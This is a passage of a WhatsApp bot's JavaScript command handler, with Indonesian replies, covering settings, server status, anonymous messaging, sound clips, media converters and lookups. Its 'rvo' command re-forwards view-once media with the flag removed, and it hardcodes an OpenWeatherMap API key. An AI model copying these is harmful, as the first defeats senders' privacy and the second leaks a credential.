                m.reply(`@${m.sender.split('@')[0]}`, {
                    mentions: [m.sender]
                }, {
                    quoted: fkontak1
                })
            }
            break
            case 'runtime':
            case 'tes':
            case 'bot': {
                let teks = text.split(' ')
                let set = db.set[botNumber]
                switch (teks[0]) {
                    case 'mode':
                        if (!isCreator) return Replyx(mess.owner)
                        if (teks[1] == 'public') {
                            if (Xlesy.public) return Replyx('*Sudah Aktif Sebelumnya*', {
                                quoted: fkontak1
                            })
                            Xlesy.public = set.public = true
                            Replyx('*Sukse Change To Public Usage*', {
                                quoted: fkontak1
                            })
                        } else if (teks[1] == 'self') {
                            Xlesy.public = set.public = false
                            Replyx('*Sukse Change To Self Usage*', {
                                quoted: fkontak1
                            })
                        } else {
                            Replyx('Mode self/public', {
                                quoted: fkontak1
                            })
                        }
                        break
                    case 'anticall':
                    case 'autobio':
                    case 'autoread':
                    case 'autotyping':
                    case 'readsw':
                    case 'multiprefix':
                    case 'antispam':
                        if (!isCreator) return Replyx(mess.owner)
                        if (teks[1] == 'on') {
                            if (set[teks[0]]) return Replyx('*Sudah Aktif Sebelumnya*', {
                                quoted: fkontak1
                            })
                            set[teks[0]] = true
                            Replyx('*Sukse Change To On*', {
                                quoted: fkontak1
                            })
                        } else if (teks[1] == 'off') {
                            set[teks[0]] = false
                            Replyx('*Sukse Change To Off*', {
                                quoted: fkontak1
                            })
                        } else {
                            m.reply(`${teks[0].charAt(0).toUpperCase() + teks[0].slice(1)} on/off`, {
                                quoted: fkontak1
                            })
                        }
                        break
                    case 'set':
                    case 'settings':
                        let settingsBot = Object.entries(set).map(([key, value]) => {
                            let list = key == 'status' ? new Date(value).toLocaleString('id-ID', {
                                hour: '2-digit',
                                minute: '2-digit',
                                second: '2-digit'
                            }) : (typeof value === 'boolean') ? (value ? 'on🟢' : 'off🔴') : value;
                            return `- ${key.charAt(0).toUpperCase() + key.slice(1)} : ${list}`;
                        }).join('\n');
                        m.reply(`Settings Bot @${botNumber.split('@')[0]}\n${settingsBot}`, {
                            quoted: fkontak1
                        })
                        break
                    default:
                        if (teks[0] || teks[1]) m.reply(`*Please Sellect Settings :*\n- Mode : *${prefix + command} mode self/public*\n- Anti Call : *${prefix + command} anticall on/off*\n- Auto Bio : *${prefix + command} autobio on/off*\n- Auto Read : *${prefix + command} autoread on/off*\n- Auto Typing : *${prefix + command} autotyping on/off*\n- Read Sw : *${prefix + command} readsw on/off*\n- Multi Prefix : *${prefix + command} multiprefix on/off*`, {
                            quoted: fkontak1
                        })
                }
                if (!teks[0] && !teks[1]) return m.reply(`*Bot Telah Online Selama*\n${runtime(process.uptime())}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'ping':
            case 'botstatus':
            case 'statusbot':
            case 'server': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
                    return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, {
                    length
                }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
                        user: 0,
                        nice: 0,
                        sys: 0,
                        idle: 0,
                        irq: 0
                    }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `☄️ _*\`Respone Speed\`*_\n${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\n🕛 _*\`Runtime\`*_\n ${runtime(process.uptime())}\n\n🌐 _*\`Info Server\`*_\nRAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}\n\n_*\`NodeJS Memory Usaage\`*_\n${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`, { quoted: fkontak1 }).join('\n')}\n\n${cpus[0] ? `_Total CPU Usage_\n${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`, { quoted: fkontak1 }).join('\n')}\n_CPU Core(s) Usage (${cpus.length} Core CPU)_\n${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`, { quoted: fkontak1 }).join('\n')}`, { quoted: fkontak1 }).join('\n\n')}` : ''}`.trim()
                Replyx(respon, {
                    quoted: fkontak1
                })
            }
            break
            case 'speedtest':
            case 'speed': {
                await Replyx('Testing Speed...')
                let cp = require('child_process')
                let {
                    promisify
                } = require('util')
                let exec = promisify(cp.exec).bind(cp)
                let o
                try {
                    o = await exec('python3 speed.py --share')
                } catch (e) {
                    o = e
                } finally {
                    let {
                        stdout,
                        stderr
                    } = o
                    if (stdout.trim()) await m.reply(stdout)
                    if (stderr.trim()) await m.reply(stderr)
                }
            }
            break
            case 'afk': {
                let user = db.users[m.sender]
                user.afkTime = +new Date
                user.afkReason = text
                m.reply(`@${m.sender.split('@')[0]} Telah Afk${text ? ': ' + text : ''}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'readviewonce':
            case 'readviewone':
            case 'rvo': {
                if (!m.quoted) return m.reply(`Reply view once message\nExample: ${prefix + command}`, {
                    quoted: fkontak1
                })
                try {
                    if (m.quoted.msg.viewOnce) {
                        delete m.quoted.chat
                        m.quoted.msg.viewOnce = false
                        await m.reply({
                            forward: m.quoted
                        })
                    } else {
                        m.reply(`Reply view once message\nExample: ${prefix + command}`, {
                            quoted: fkontak1
                        })
                    }
                } catch (e) {
                    Replyx('Media Tidak Valid!')
                }
            }
            break
            case 'inspect': {
                if (!text) return Replyx('Masukkan Link Group!')
                let _grup = /chat.whatsapp.com\/([\w\d]*)/;
                let _saluran = /whatsapp\.com\/channel\/([\w\d]*)/;
                if (_grup.test(text)) {
                    await Xlesy.groupGetInviteInfo(text.match(_grup)[1]).then((_g) => {
                        let teks = `*[ INFORMATION GROUP ]*\n\nName Group: ${_g.subject}\nGroup ID: ${_g.id}\nCreate At: ${new Date(_g.creation * 1000).toLocaleString()}${_g.owner ? ('\nCreate By: ' + _g.owner) : '' }\nLinked Parent: ${_g.linkedParent}\nRestrict: ${_g.restrict}\nAnnounce: ${_g.announce}\nIs Community: ${_g.isCommunity}\nCommunity Announce:${_g.isCommunityAnnounce}\nJoin Approval: ${_g.joinApprovalMode}\nMember Add Mode: ${_g.memberAddMode}\nDescription ID: ${'`' + _g.descId + '`'}\nDescription: ${_g.desc}\nParticipants:\n`
                        _g.participants.forEach((a) => {
                            teks += a.admin ? `- Admin: @${a.id.split('@')[0]} [${a.admin}]\n` : ''
                        })
                        m.reply(teks)
                    }).catch((e) => {
                        if ([400, 406].includes(e.data)) return Replyx('Grup Tidak Di Temukan❗');
                        if (e.data == 401) return Replyx('Bot Di Kick Dari Grup Tersebut❗');
                        if (e.data == 410) return Replyx('Url Grup Telah Di Setel Ulang❗');
                    });
                } else if (_saluran.test(text) || text.endsWith('@newsletter') || !isNaN(text)) {
                    await Xlesy.newsletterMsg(text.match(_saluran)[1]).then((n) => {
                        m.reply(`*[ INFORMATION CHANNEL ]*\n\nID: ${n.id}\nState: ${n.state.type}\nName: ${n.thread_metadata.name.text}\nCreate At: ${new Date(n.thread_metadata.creation_time * 1000).toLocaleString()}\nSubscriber: ${n.thread_metadata.subscribers_count}\nVerification: ${n.thread_metadata.verification}\nDescription: ${n.thread_metadata.description.text}\n`, {
                            quoted: fkontak1
                        })
                    }).catch((e) => Replyx('Saluran Tidak Di Temukan❗'))
                } else {
                    Replyx('Hanya Support Url Grup atau Saluran!')
                }
            }
            break
            case 'addmsg': {
                if (!m.quoted) return Replyx('Reply Pesan Yang Ingin Disave Di Database')
                if (!text) return m.reply(`Example : ${prefix + command} file name`, {
                    quoted: fkontak1
                })
                let msgs = db.database
                if (text.toLowerCase() in msgs) return m.reply(`'${text}' telah terdaftar di list pesan`, {
                    quoted: fkontak1
                })
                msgs[text.toLowerCase()] = m.quoted
                delete msgs[text.toLowerCase()].chat
                m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'\nAkses dengan ${prefix}getmsg ${text}\nLihat list Pesan Dengan ${prefix}listmsg`, {
                    quoted: fkontak1
                })
            }
            break
            case 'delmsg':
            case 'deletemsg': {
                if (!text) return Replyx('Nama msg yg mau di delete?')
                let msgs = db.database
                if (text == 'allmsg') {
                    db.database = {}
                    Replyx('Berhasil menghapus seluruh msg dari list pesan')
                } else {
                    if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`, {
                        quoted: fkontak1
                    })
                    delete msgs[text.toLowerCase()]
                    m.reply(`Berhasil menghapus '${text}' dari list pesan`, {
                        quoted: fkontak1
                    })
                }
            }
            break
            case 'getmsg': {
                if (!text) return m.reply(`Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`, {
                    quoted: fkontak1
                })
                let msgs = db.database
                if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar di list pesan`, {
                    quoted: fkontak1
                })
                await Xlesy.relayMessage(m.chat, msgs[text.toLowerCase()], {})
            }
            break
            case 'listmsg': {
                let seplit = Object.entries(db.database).map(([nama, isi]) => {
                    return {
                        nama,
                        message: getContentType(isi)
                    }
                })
                let teks = '「 LIST DATABASE 」\n\n'
                for (let i of seplit) {
                    teks += `${setv} *Name :* ${i.nama}\n${setv} *Type :* ${i.message?.replace(/Message/i, '')}\n───────────────\n`
                }
                m.reply(teks)
            }
            break
            case 'q':
            case 'quoted': {
                if (!m.quoted) return Replyx('Reply Pesannya!')
                const anu = await m.getQuotedObj()
                if (!anu) return Replyx('Format Tidak Tersedia!')
                if (!anu.quoted) return Replyx('Pesan Yang Anda Reply Tidak Mengandung Reply')
                await Xlesy.relayMessage(m.chat, {
                    [anu.quoted.type]: anu.quoted.msg
                }, {})
            }
            break
            case 'confes':
            case 'confess':
            case 'menfes':
            case 'menfess': {
                if (!isLimit) return Replyx(mess.limit)
                if (m.isGroup) return m.reply(mess.private)
                if (menfes[m.sender]) return m.reply(`Kamu Sedang Berada Di Sesi ${command}!`, {
                    quoted: fkontak1
                })
                if (!text) return m.reply(`Example : ${prefix + command} 62xxxx|Nama Samaran`, {
                    quoted: fkontak1
                })
                let [teks1, teks2] = text.split`|`
                if (teks1) {
                    const tujuan = teks1.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const onWa = await Xlesy.onWhatsApp(tujuan)
                    if (!onWa.length > 0) return Replyx('Nomer Tersebut Tidak Terdaftar Di Whatsapp!')
                    menfes[m.sender] = {
                        tujuan: tujuan,
                        nama: teks2 ? teks2 : 'Orang',
                        waktu: setTimeout(() => {
                            if (menfes[m.sender]) m.reply(`_Waktu ${command} habis_`, {
                                quoted: fkontak1
                            })
                            delete menfes[m.sender];
                        }, 600000)
                    };
                    menfes[tujuan] = {
                        tujuan: m.sender,
                        nama: 'Penerima',
                        waktu: setTimeout(() => {
                            if (menfes[tujuan]) Xlesy.sendMessage(tujuan, {
                                text: `_Waktu ${command} habis_`
                            });
                            delete menfes[tujuan];
                        }, 600000)
                    };
                    Xlesy.sendMessage(tujuan, {
                        text: `_${command} connected_\n*Note :* jika ingin mengakhiri ketik _*${prefix}del${command}*_`
                    });
                    m.reply(`_Memulai ${command}..._\n*Silahkan Mulai kirim pesan/media*\n*Durasi ${command} hanya selama 10 menit*\n*Note :* jika ingin mengakhiri ketik _*${prefix}del${command}*_`, {
                        quoted: fkontak1
                    })
                    setLimit(m, db)
                } else {
                    m.reply(`Masukkan Nomernya!\nExample : ${prefix + command} 62xxxx|Nama Samaran`, {
                        quoted: fkontak1
                    })
                }
            }
            break
            case 'delconfes':
            case 'delconfess':
            case 'delmenfes':
            case 'delmenfess': {
                if (!menfes[m.sender]) return m.reply(`Kamu Tidak Sedang Berada Di Sesi ${command.split('del')[1]}!`, {
                    quoted: fkontak1
                })
                let anu = menfes[m.sender]
                Xlesy.sendMessage(anu.tujuan, {
                    text: `Chat Di Akhiri Oleh ${anu.nama ? anu.nama : 'Seseorang'}`
                })
                m.reply(`Sukses Mengakhiri Sesi ${command.split('del')[1]}!`, {
                    quoted: fkontak1
                })
                delete menfes[anu.tujuan];
                delete menfes[m.sender];
            }
            break
            case 'jadibot': {
                if (!isPremium) return m.reply(mess.prem)
                if (!isLimit) return Replyx(mess.limit)
                const nmrnya = text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.sender
                const onWa = await Xlesy.onWhatsApp(nmrnya)
                if (!onWa.length > 0) return Replyx('Nomer Tersebut Tidak Terdaftar Di Whatsapp!')
                await JadiBot(Xlesy, nmrnya, m)
                m.reply(`Gunakan ${prefix}stopjadibot\nUntuk Berhenti`, {
                    quoted: fkontak1
                })
                setLimit(m, db)
            }
            break
            case 'stopjadibot':
            case 'deljadibot': {
                const nmrnya = text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.sender
                const onWa = await Xlesy.onWhatsApp(nmrnya)
                if (!onWa.length > 0) return Replyx('Nomer Tersebut Tidak Terdaftar Di Whatsapp!')
                await StopJadiBot(Xlesy, nmrnya, m)
            }
            break
            case 'listjadibot': {
                ListJadiBot(Xlesy, m)
            }
            break
            //Music Menu
            case 'music1':
case 'music2':
case 'music3':
case 'music4':
case 'music5':
case 'music6':
case 'music7':
case 'music8':
case 'music9':
case 'music10':
case 'music11':
case 'music12':
case 'music13':
case 'music14':
case 'music15':
case 'music16':
case 'music17':
case 'music18':
case 'music19':
case 'music20':
case 'music21':
case 'music22':
case 'music23':
case 'music24':
case 'music25':
case 'music26':
case 'music27':
case 'music28':
case 'music29':
case 'music30':
case 'music31':
case 'music32':
case 'music33':
case 'music34':
case 'music35':
case 'music36':
case 'music37':
case 'music38':
case 'music39':
case 'music40':
case 'music41':
case 'music42':
case 'music43':
case 'music44':
case 'music45':
case 'music46':
case 'music47':
case 'music48':
case 'music49':
case 'music50':
case 'music51':
case 'music52':
case 'music53':
case 'music54':
case 'music55':
case 'music56':
case 'music57':
case 'music58':
case 'music59':
case 'music60':
case 'music61':
case 'music62':
case 'music63':
case 'music64':
case 'music65':
case 'music66':
case 'music67':
case 'music68':
case 'music69':
case 'music70':
case 'music71':
case 'music72':
case 'music73':
case 'music74':
case 'music75':
case 'music76':
case 'music77':
case 'music78':
case 'music79':
case 'music80':
case 'music81':
case 'music82':
case 'music83':
case 'music84':
case 'music85':
Replyx(mess.load)
Xlesy.sendMessage(m.chat, { react: { text: 'ðŸŽ§', key: m.key }})
sound = await getBuffer(`https://github.com/ditss-dev/database/raw/main/musikk/${command}.mp3`)
await Xlesy.sendMessage(m.chat, { audio: sound, mimetype: 'audio/mp4', ptt: true }, { quoted: fkontak1 })     
break
 case "sad1":
 case "sad2":
 case "sad3":
 case "sad4":
 case "sad5":
 case "sad6":
 case "sad7":
 case "sad8":
 case "sad9":
 case "sad10":
 case "sad11":
 case "sad12":
 case "sad13":
 case "sad14":
 case "sad15":
 case "sad16":
 case "sad17":
 case "sad18":
 case "sad19":
 case "sad20":
 case "sad21":
 case "sad22":
 case "sad23":
 case "sad24":
 case "sad25":
 case "sad26":
 case "sad27":
 case "sad28":
 case "sad29":
 case "sad30":
 case "sad31":
 case "sad32":
 case "sad33":
 case "sad34":
 case "sad35":
 Replyx(mess.load)
 const moai0 = await getBuffer(
 `https://github.com/ZassTdr/Sound-Sad/raw/main/Sad-Music/${command}.mp3`
 );
 Xlesy.sendMessage(
 m.chat,
 {
 audio: moai0,
 mimetype: "audio/mp4",
 ptt: true,
 },
 { quoted: fkontak1 }
 );
 //D|ts Si pler
break
 case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'Sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
Replyx(mess.load)
var resttt = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
 Xlesy.sendMessage(m.chat, { audio: resttt, mimetype: 'audio/mp4', ptt: true, 
})
//Dts Gxyenn
break 
            // Tools Menu          
            case 'fetch':
            case 'get': {
                if (!isPremium) return m.reply(mess.prem)
                if (!isLimit) return Replyx(mess.limit)
                if (!/^https?:\/\//.test(text)) return Replyx('Awali dengan http:// atau https://');
                try {
                    const res = await axios.get(isUrl(text) ? isUrl(text)[0] : text)
                    if (!/text|json|html|plain/.test(res.headers['content-type'])) {
                        await m.reply(text)
                    } else {
                        m.reply(util.format(res.data))
                    }
                    setLimit(m, db)
                } catch (e) {
                    m.reply(String(e))
                }
            }
            break
            case 'toaud':
            case 'toaudio': {
                if (!/video|audio/.test(mime)) return Replyx(`Kirim/reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`, {
                    quoted: fkontak1
                })
                Replyx(mess.wait)
                let media = await quoted.download()
                let audio = await toAudio(media, 'mp4')
                await m.reply({
                    audio: audio,
                    mimetype: 'audio/mpeg'
                })
            }
            break
            case 'tomp3': {
                if (!/video|audio/.test(mime)) return Replyx(`Kirim/reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`, {
                    quoted: fkontak1
                })
                Replyx(mess.wait)
                let media = await quoted.download()
                let audio = await toAudio(media, 'mp4')
                await m.reply({
                    document: audio,
                    mimetype: 'audio/mpeg',
                    fileName: `Convert Xlesy Bot.mp3`
                })
            }
            break
            case 'tovn':
            case 'toptt':
            case 'tovoice': {
                if (!/video|audio/.test(mime)) return Replyx(`Kirim/reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`, {
                    quoted: fkontak1
                })
                Replyx(mess.wait)
                let media = await quoted.download()
                let audio = await toPTT(media, 'mp4')
                await m.reply({
                    audio: audio,
                    mimetype: 'audio/ogg; codecs=opus',
                    ptt: true
                })
            }
            break
            case 'togif': {
                if (!/webp|video/.test(mime)) return m.reply(`Reply Video/Stiker dengan caption *${prefix + command}*`, {
                    quoted: fkontak1
                })
                Replyx(mess.wait)
                let media = await Xlesy.downloadAndSaveMediaMessage(qmsg)
                let ran = `./database/sampah/${getRandom('.gif')}`;
                exec(`convert ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return Replyx('Gagal❗')
                    let buffer = fs.readFileSync(ran)
                    m.reply({
                        video: buffer,
                        gifPlayback: true
                    })
                    fs.unlinkSync(ran)
                })
            }
            break
            case 'toimage':
            case 'toimg': {
                if (!/webp|video/.test(mime)) return m.reply(`Reply Video/Stiker dengan caption *${prefix + command}*`, {
                    quoted: fkontak1
                })
                Replyx(mess.wait)
                let media = await Xlesy.downloadAndSaveMediaMessage(qmsg)
                let ran = `./database/sampah/${getRandom('.png')}`;
                exec(`convert ${media}[0] ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return Replyx('Gagal❗')
                    let buffer = fs.readFileSync(ran)
                    m.reply({
                        image: buffer
                    })
                    fs.unlinkSync(ran)
                })
            }
            break
            case 'toptv': {
                if (!/video/.test(mime)) return Replyx(`Kirim/reply Video Yang Ingin Dijadikan PTV Message Dengan Caption ${prefix + command}`, {
                    quoted: fkontak1
                })
                if ((m.quoted ? m.quoted.type : m.type) === 'videoMessage') {
                    const anu = await quoted.download()
                    const msg = await generateWAMessageContent({
                        video: anu
                    }, {
                        upload: Xlesy.waUploadToServer
                    })
                    await Xlesy.relayMessage(m.chat, {
                        ptvMessage: msg.videoMessage
                    }, {})
                } else {
                    Replyx('Reply Video Yang Mau Di Ubah Ke PTV Message!')
                }
            }
            break
            case 'tourl': {
                try {
                    if (/webp|video|sticker|audio|jpg|jpeg|png/.test(mime)) {
                        Replyx(mess.wait)
                        let media = await quoted.download()
                        let anu = await UguuSe(media)
                        Replyx('Url : ' + anu.url)
                    } else {
                        Replyx('Send Media yg ingin di Upload!')
                    }
                } catch (e) {
                    Replyx('Server Uploader sedang offline!')
                }
            }
            break
            case 'texttospech':
            case 'tts':
            case 'tospech': {
                if (!text) return Replyx('Mana text yg mau diubah menjadi audio?')
                let {
                    tts
                } = require('./lib/tts')
                let anu = await tts(text)
                m.reply({
                    audio: anu,
                    ptt: true,
                    mimetype: 'audio/mpeg'
                })
            }
            break
            case 'translate':
            case 'tr': {
                if (text && text == 'list') {
                    let list_tr = `╭──┈➤「 *Kode Bahasa* 」❍\n│• af : Afrikaans\n│• ar : Arab\n│• zh : Chinese\n│• en : English\n│• en-us : English (United States)\n│• fr : French\n│• de : German\n│• hi : Hindi\n│• hu : Hungarian\n│• is : Icelandic\n│• id : Indonesian\n│• it : Italian\n│• ja : Japanese\n│• ko : Korean\n│• la : Latin\n│• no : Norwegian\n│• pt : Portuguese\n│• pt : Portuguese\n│• pt-br : Portuguese (Brazil)\n│• ro : Romanian\n│• ru : Russian\n│• sr : Serbian\n│• es : Spanish\n│• sv : Swedish\n│• ta : Tamil\n│• th : Thai\n│• tr : Turkish\n│• vi : Vietnamese\n╰──────┈➤`;
                    m.reply(list_tr)
                } else {
                    if (!m.quoted && (!text || !args[1])) return Replyx(`Kirim/reply text dengan caption ${prefix + command}`, {
                        quoted: fkontak1
                    })
                    let lang = args[0] ? args[0] : 'id'
                    let teks = args[1] ? args.slice(1).join(' ') : m.quoted.text
                    try {
                        let hasil = await translate(teks, {
                            to: lang,
                            autoCorrect: true
                        })
                        m.reply(`To : ${lang}\n${hasil[0]}`, {
                            quoted: fkontak1
                        })
                    } catch (e) {
                        m.reply(`Lang *${lang}* Tidak Di temukan!\nSilahkan lihat list, ${prefix + command} list`, {
                            quoted: fkontak1
                        })
                    }
                }
            }
            break
            case 'toqr':
            case 'qr': {
                if (!text) return m.reply(`Ubah Text ke Qr dengan *${prefix + command}* textnya`, {
                    quoted: fkontak1
                })
                Replyx(mess.wait)
                await m.reply({
                    image: {
                        url: 'https://api.qrserver.com/v1/create-qr-code/?size=1000x1000&data=' + text
                    },
                    caption: 'Nih Bro'
                })
            }
            case 'ssweb': {
                if (!isPremium) return m.reply(mess.prem)
                if (!text) return Replyx(`Example: ${prefix + command} https://gxyenn-site.vercel.app/`, {
                    quoted: fkontak1
                })
                try {
                    let anu = 'https://' + text.replace(/^https?:\/\//, '')
                    await m.reply({
                        image: {
                            url: 'https://image.thum.io/get/width/1900/crop/1000/fullpage/' + anu
                        },
                        caption: 'Done'
                    }, {
                        quoted: fkontak1
                    })
                } catch (e) {
                    Replyx('Server SS web Sedang Offline!', {
                        quoted: fkontak1
                    })
                }
            }
            break
            case 'readmore': {
                let teks1 = text.split`|` [0] ? text.split`|` [0] : ''
                let teks2 = text.split`|` [1] ? text.split`|` [1] : ''
                m.reply(teks1 + readmore + teks2)
            }
            break
            case 'getexif': {
                if (!m.quoted) return m.reply(`Reply sticker\nDengan caption ${prefix + command}`, {
                    quoted: fkontak1
                })
                if (!/sticker|webp/.test(quoted.type)) return m.reply(`Reply sticker\nDengan caption ${prefix + command}`, {
                    quoted: fkontak1
                })
                const img = new webp.Image()
                await img.load(await m.quoted.download())
                m.reply(util.format(JSON.parse(img.exif.slice(22).toString())))
            }
            break
            case 'waktudunia':
                const cheerio = require('cheerio');
                const moment = require('moment-timezone');

                async function waktu() {
                    const url = 'https://onlinealarmkur.com/world/id/'
                    try {
                        const {
                            data
                        } = await axios.get(url)
                        const $ = cheerio.load(data)
                        let hasil = []
                        $('.flex.items-center.space-x-3').each((index, element) => {
                            const bndera = $(element).find('.avatar .text-2xl').text().trim()
                            const kota = $(element).find('.city-name').text().trim()
                            const Zona = $(element).find('.city-time').attr('data-tz')
                            if (Zona) {
                                const realTime = moment().tz(Zona).format('ddd - HH:mm')
                                hasil.push({
                                    bndera,
                                    kota,
                                    waktu: realTime
                                })
                            }
                        })
                        return hasil
                    } catch (error) {
                        return []
                    }
                }

                let hasilWaktu = await waktu()
                if (hasilWaktu.length === 0) {
                    return Xlesy.sendMessage(m.chat, {
                        text: 'Gagal mengambil data waktu'
                    }, {
                        quoted: fkontak1
                    })
                }

                let pesanWaktu = '*🕰️ Waktu Dunia Saat Ini 🕰️*\n\n'
                hasilWaktu.forEach(item => {
                    pesanWaktu += `${item.bndera} *${item.kota}* -          ${item.waktu}\n`
                })

                await Xlesy.sendMessage(m.chat, {
                    text: pesanWaktu
                }, {
                    quoted: fkontak1
                })
                break                 
                 case "infonegara": case "country": {
    if (!q) return Replyx("Masukkan nama negara! Contoh: .infonegara Vietnam");
    let url = `https://api.siputzx.my.id/api/tools/countryInfo?name=${encodeURIComponent(q)}`;
    try {
        let res = await fetch(url);
        let json = await res.json();
        if (!json.status) return Replyx("Negara tidak ditemukan!");
        let data = json.data;
        let neighbors = data.neighbors.map(n => `- ${n.name} (${n.flag})`).join("\n");
        let replyText = `🌍 *Informasi Negara: ${data.name}*\n\n` +
            `🏛 *Ibukota:* ${data.capital}\n` +
            `📍 *Koordinat:* ${data.coordinates.latitude}, ${data.coordinates.longitude}\n` +
            `🏴 *Bendera:* ${data.flag}\n` +
            `📞 *Kode Telepon:* ${data.phoneCode}\n` +
            `🗺 *Peta:* ${data.googleMapsLink}\n` +
            `🌏 *Benua:* ${data.continent.name} ${data.continent.emoji}\n` +
            `🗣 *Bahasa:* ${data.languages.native.join(", ")}\n` +
            `💰 *Mata Uang:* ${data.currency}\n` +
            `🚗 *Lajur Kendaraan:* ${data.drivingSide}\n` +
            `🌟 *Terkenal Sebagai:* ${data.famousFor}\n` +
            `🏛 *Bentuk Pemerintahan:* ${data.constitutionalForm}\n` +
            `🌐 *Domain Internet:* ${data.internetTLD}\n` +
            `🌍 *Negara Tetangga:*\n${neighbors || "Tidak ada"}\n`;
        let buttons = [
            { buttonId: `${prefix}infonegara ${data.name}`, buttonText: { displayText: "🔄 Cek Lagi" }, type: 1 },
            { buttonId: `.menu`, buttonText: { displayText: "📜 Menu" }, type: 1 }
        ];
        let message = {
            text: replyText,
            footer: "Country Info Bot",
            buttons: buttons,
            headerType: 1,
            image: { url: data.flag }
        };
        Xlesy.sendMessage(m.chat, message, { quoted: fkontak1 });
    } catch (err) {
        console.error(err);
        Replyx("Terjadi kesalahan saat mengambil data.");
    }
}
    break                     
            case 'cuaca':
            case 'weather': {
                await Xlesy.sendMessage(m.chat, {
                    react: {
                        text: '🔍',
                        key: m.key
                    }
                })
                if (!text) return Replyx(`Example: ${prefix + command} jakarta`, {
                    quoted: fkontak1
                })
                try {
                    let data = await fetchJson(`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`, {
                        quoted: fkontak1
                    })
